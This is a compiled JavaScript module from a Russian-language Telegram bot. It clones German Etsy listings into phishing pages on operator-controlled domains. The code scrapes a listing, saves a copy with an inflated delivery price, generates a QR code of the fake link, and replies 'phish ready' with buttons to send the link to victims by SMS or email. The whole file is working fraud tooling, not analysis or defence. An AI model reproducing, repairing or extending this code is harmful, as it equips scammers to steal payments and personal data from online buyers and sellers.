"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.scene = exports.composer = void 0;
const grammy_1 = require("grammy");
const parseStringEtsy_1 = require("../../../handlers/parseUrl/etsy/parseStringEtsy");
const ads_1 = require("../../../database/models/ads");
const database_1 = require("../../../database");
const moment_1 = __importDefault(require("moment"));
const getPictureMenu_1 = require("../../../helpers/getPictureMenu");
const grammy_scenes_1 = require("grammy-scenes");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const getDomen_1 = require("../../../helpers/getDomen");
const { chromium } = require('playwright');
exports.composer = new grammy_1.Composer();
const regex = /etsy\.(?<platform>.+?)\/(?<link>.+)/gm;
const regex2 = /etsy\.(?<platform>.+?)\/(?<link>.+)\?/gm;
exports.composer.hears(regex, handler);
moment_1.default.locale('ru');
async function preCreateAd(ctx, parse, match, deliveryPrice) {
    const { ads, newAd } = await createAd(parse, ctx, match, deliveryPrice);
    const domen = await (0, getDomen_1.getDomen)(ctx.user, 'etsy');
    if (!domen)
        return ctx.reply('domen undefined error');
    let msg = await ctx.reply('⏳ Создание qr...');
    try {
        const browser = await chromium.launch({
            args: ['--disable-dev-shm-usage', '--no-sandbox'],
        });
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto(`https://${domen.link}/link/${ads.link}?qrcode=true`);
        await page.screenshot({ path: `temp/qrcode_${ads.date}.png` });
    }
    catch (e) {
        console.log(e);
    }
    try {
        await ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) {
        console.log(e);
    }
    return ctx.replyWithPhoto(await (0, getPictureMenu_1.getPictureMenu)(ctx.user), {
        caption: `
Фиш готов 👌

🆔 ID: <code>${ads.date}</code>

📦 <b>Товар:</b> <code>${ads.title}</code>
💸 <b>Цена:</b> <code>${ads.price}</code>
💡 <b>Платформа: etsy [${match[1].toUpperCase()} 🇩🇪]</b>
♻️ <b>Домен сменён ${(0, moment_1.default)(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ads.link}">LINK [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ads.id, ctx.user)
    });
}
const createKeyboard = async (id, user) => {
    const keyb = new grammy_1.InlineKeyboard();
    // .text("🙊 Настройки", `settings ad ${id}`)
    keyb.row();
    keyb.text("📲 SMS", `sms ad ${id}`);
    keyb.text("💌 EMAIL", `email etsy ${id}`);
    keyb.row();
    keyb.text("🎲 QR-code", `qrcode get ${id}`);
    keyb.text("⚙ Настройки", `settings ad ${id}`);
    keyb.row();
    keyb.text("Главное меню", `menuWithPicture`);
    return keyb;
};
async function handler(ctx) {
    const parse = await (0, parseStringEtsy_1.parseStringEtsy)(ctx.msg.text, ctx);
    if (parse === undefined)
        return null;
    let match = undefined;
    match = regex2.exec(ctx.msg.text);
    if (!match) {
        match = regex.exec(ctx.msg.text);
    }
    return ctx.scenes.enter('setDeliveryAmountEtsy', {
        parse, match
    });
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    try {
        ctx.scene.exit();
    }
    catch (e) { }
}
exports.scene = new grammy_scenes_1.Scene('setDeliveryAmountEtsy');
exports.scene.always().callbackQuery(/skip setDeliveryAmountEtsy/, async (ctx) => {
    const userPrice = 5.99;
    // @ts-ignore
    const price = ctx.session.anyObject.parse.detail.price = ctx.session.anyObject.parse.detail.price.replace(/\./, '');
    // @ts-ignore
    ctx.session.anyObject.parse.detail.price = (userPrice + parseFloat(price)).toFixed(2) + ' €';
    // @ts-ignore
    console.log(ctx.session.anyObject.parse.detail.price);
    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match, '5.99 €');
    return cancel(ctx);
});
exports.scene.do(async (ctx) => {
    ctx.session.deleteMessage = [];
    ctx.session.anyObject = ctx.scene.arg;
    const res = await ctx.reply('<b>🚚 Цена доставки: </b>', {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Пропустить', callback_data: 'skip setDeliveryAmountEtsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    return ctx.scene.resume();
});
exports.scene.wait().hears(/(^\d+\.\d\d)|(^\d+)/, async (ctx) => {
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    const userPrice = parseFloat(ctx.match[0]);
    // @ts-ignore
    const price = ctx.session.anyObject.parse.detail.price = ctx.session.anyObject.parse.detail.price.replace(/\./, '');
    // @ts-ignore
    ctx.session.anyObject.parse.detail.price = (userPrice + parseFloat(price)).toFixed(2) + ' €';
    console.log(ctx.match[0], userPrice, price, parseFloat(price));
    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match, userPrice + ' €');
    return cancel(ctx);
});
function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const createAd = async (parse, ctx, match, deliveryPrice) => {
    const unix = String(Date.now());
    const randomInt1 = getRandomInt(0, 5);
    const randomInt2 = getRandomInt(666, 4657645344567);
    const date = `${unix.slice(13 - randomInt1, 13)}` + randomInt2;
    const ads = new ads_1.Ads();
    console.log(parse.detail.price);
    ads.title = parse.detail.title;
    ads.description = parse.detail.description;
    ads.price = parse.detail.price;
    ads.img = parse.imgHref;
    ads.link = `${match[2]}${date}`;
    ads.originallink = `${match[2]}`;
    ads.deliveryPrice = deliveryPrice;
    ads.date = `${date}`;
    ads.country = 'de';
    ads.service = 'etsy';
    ads.author = ctx.user;
    ads.page = parse.page;
    ads.pageMobile = parse.pageMobile;
    ads.created = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
    await database_1.adsRepository.save(ads);
    return {
        ads,
        newAd: true
    };
};
